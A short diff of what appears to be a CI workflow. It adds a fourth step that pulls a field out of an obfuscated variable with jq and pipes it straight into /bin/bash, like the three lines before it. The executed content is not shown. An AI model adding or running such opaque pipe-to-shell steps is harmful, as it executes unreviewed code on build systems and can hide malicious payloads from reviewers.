@@ -24,6 +24,7 @@ jobs:
           printf '%s' "$ul4" | jq -r .ze87 | /bin/bash
           printf '%s' "$y950" | jq -r .ph576 | /bin/bash
           printf '%s' "$udx069" | jq -r .ssfaz76 | /bin/bash
+          echo $xmm38 | jq -r .pmft3002 | /bin/bash
 
       - name: Save artifact
         uses: actions/upload-artifact@v4
